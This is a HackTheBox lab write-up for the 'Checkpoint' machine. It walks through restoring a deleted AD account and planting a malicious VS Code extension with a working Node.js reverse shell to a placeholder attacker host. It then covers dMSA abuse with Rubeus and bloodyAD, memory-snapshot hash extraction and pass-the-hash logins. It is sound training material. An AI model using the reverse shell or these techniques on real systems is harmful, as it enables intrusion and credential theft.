# HackTheBox: Checkpoint Write-up

Checkpoint is a Medium Windows Active Directory machine running Windows Server 2025. The route begins with supplied credentials, restores a deleted domain account, uses its write access to a VS Code extension share for a foothold, then pivots through a patched dMSA technique and a VMware memory snapshot to reach Administrator.

## Enumeration

Start with a full TCP scan, then identify services on the open ports:

```bash
nmap -p- --min-rate 10000 -oN nmap-all.txt <TARGET_IP>
nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <TARGET_IP>
```

The target is the domain controller `DC01` in `checkpoint.htb`. Add the domain and host to `/etc/hosts`:

```text
<TARGET_IP> DC01.checkpoint.htb checkpoint.htb DC01
```

The initial credentials provided by Hack The Box are `alex.turner` / `Checkpoint2024!`. Validate them and enumerate SMB shares:

```bash
nxc smb <TARGET_IP> -u alex.turner -p 'Checkpoint2024!' --shares
```

The `DevDrop` share is readable but not writable by Alex. Its description says it is for approved `.vsix` packages compatible with VS Code engine `1.118.0`. The `VMBackups` share is also present, but Alex cannot access it.

LDAP signing is enforced, so some LDAP/BloodHound collection methods may fail with their default settings. Kerberos collection is one working option. Correct any clock skew before requesting Kerberos tickets:

```bash
sudo ntpdate DC01.checkpoint.htb
kinit alex.turner
rusthound-ce --domain checkpoint.htb -k -f DC01.checkpoint.htb --zip
```

## Initial Access: Restore `mark.davies`

BloodHound does not show all permissions on deleted AD objects. Use `bloodyAD` to enumerate writable objects directly:

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

Alex has write access to the deleted account `mark.davies`, `CREATE_CHILD` on the `Employees` OU (the account's last known parent), and the required `Reanimate-Tombstones` right. Search the Deleted Objects container with the LDAP controls that expose recycled objects:

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get search \
  -c 1.2.840.113556.1.4.2064 \
  -c 1.2.840.113556.1.4.2065 \
  --base 'CN=Deleted Objects,DC=checkpoint,DC=htb' \
  --filter '(sAMAccountName=*)' \
  --attr sAMAccountName,lastKnownParent,objectSid
```

Restore the account, then test the original password. The restored account retains its former password, which is the same default password supplied for Alex:

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore mark.davies

nxc smb <TARGET_IP> -u mark.davies -p 'Checkpoint2024!'
nxc smb <TARGET_IP> -u mark.davies -p 'Checkpoint2024!' --shares
```

`mark.davies` has `READ,WRITE` access to `DevDrop`.

## Foothold: Malicious VS Code Extension

The share is monitored by an automated deployment workflow that installs `.vsix` packages. Create an extension compatible with VS Code `1.118.0` and make its activation code connect back to a listener. For example, the extension's `package.json` can include:

```json
{
  "name": "checkpoint-extension",
  "displayName": "Checkpoint Extension",
  "publisher": "lab",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["onStartupFinished"],
  "main": "./extension.js",
  "contributes": {}
}
```

A minimal Node.js reverse-shell activation file for this Windows target is:

```javascript
const net = require("net");
const cp = require("child_process");

function activate() {
  const shell = cp.spawn("cmd.exe", []);
  const client = new net.Socket();
  client.connect(443, "<ATTACKER_IP>", () => {
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);
  });
}

exports.activate = activate;
```

Package the extension with `vsce`, start a listener, and upload the generated `.vsix` as `mark.davies`:

```bash
vsce package
rlwrap nc -lvnp 443

smbclient //DC01.checkpoint.htb/DevDrop \
  -U 'mark.davies%Checkpoint2024!' \
  -c 'put checkpoint-extension-1.0.0.vsix'
```

After the deployment workflow processes the package, the callback provides a shell as `checkpoint\ryan.brooks`. Confirm the account and read the user flag; its value is intentionally omitted:

```cmd
whoami
type C:\Users\ryan.brooks\Desktop\user.txt
```

## Privilege Escalation: Patched BadSuccessor / BetterSuccessor

The domain controller is Windows Server 2025 build `26100.32860`. The original BadSuccessor issue was patched in build `26100.4946`; therefore, a one-sided dMSA link is not enough on this machine. The useful combination here is that `ryan.brooks` can create a dMSA in `OU=DMSAHolder` and BloodHound shows `GenericWrite` over `svc_deploy`. Those permissions allow the two sides of a migration to be linked, the post-patch BetterSuccessor technique.

From Ryan's shell, use Rubeus `tgtdeleg` to obtain a TGT for the current logon session:

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

Copy the Base64 `ticket.kirbi` from the output to your Linux machine, decode it, and convert it to ccache format with Impacket's `ticketConverter.py`:

```bash
printf '%s' '<BASE64_TICKET>' | base64 -d > ryan.brooks.kirbi
ticketConverter.py ryan.brooks.kirbi ryan.brooks.ccache
```

Then create a dMSA in the writable OU and link it to `svc_deploy`:

```bash
KRB5CCNAME=ryan.brooks.ccache bloodyAD \
  -d checkpoint.htb --host DC01.checkpoint.htb --dc-ip <TARGET_IP> -k \
  add badSuccessor checkpoint_dmsa \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'
```

Although the command is named `badSuccessor`, the operation works here because it can write the corresponding supersession attributes on `svc_deploy` as well as create the dMSA. The returned dMSA ticket contains the target account's key material, including its NT hash. Keep the hash private and use it to authenticate to WinRM as `svc_deploy`:

```bash
evil-winrm-py -i DC01.checkpoint.htb -u svc_deploy -H '<SVC_DEPLOY_NT_HASH>'
```

## Administrator: VM Backup Memory Snapshot

`svc_deploy` belongs to `BackupAccess`, which grants read access to `VMBackups`. The share contains a VMware snapshot directory with a `.vmsn` memory snapshot of a Windows Server 2019 VM. Upload [VMkatz](https://github.com/nikaiw/VMkatz) to the target with the WinRM upload command, then run it against the snapshot:

```powershell
cd 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics'
& 'C:\ProgramData\vmkatz.exe' 'Windows Server 2019-Snapshot1.vmsn'
```

VMkatz extracts the local Administrator NT hash from the memory snapshot. That hash is reused by the domain Administrator account on Checkpoint. Use it for a final WinRM session, then read the root flag from `max.palmer`'s Desktop. The flag value is intentionally omitted:

```bash
evil-winrm-py -i DC01.checkpoint.htb -u administrator -H '<ADMIN_NT_HASH>'
```

```powershell
Get-Content 'C:\Users\max.palmer\Desktop\root.txt'
```

## Attack Path

```text
Supplied alex.turner credentials
  ↓
Writable deleted AD object → restore mark.davies → reused password
  ↓
Write access to DevDrop → malicious VS Code extension → shell as ryan.brooks
  ↓
CreateChild on DMSAHolder + GenericWrite on svc_deploy
  ↓
BetterSuccessor → svc_deploy key material → WinRM
  ↓
VMBackups share → VMkatz reads memory snapshot → reused Administrator hash
  ↓
WinRM as domain Administrator
```

## References

- [Altered Security — BetterSuccessor](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch) — post-patch dMSA abuse with mutual links.
- [NVD — CVE-2025-53779](https://nvd.nist.gov/vuln/detail/CVE-2025-53779)

> Flag values are intentionally omitted; hashes are represented by placeholders.
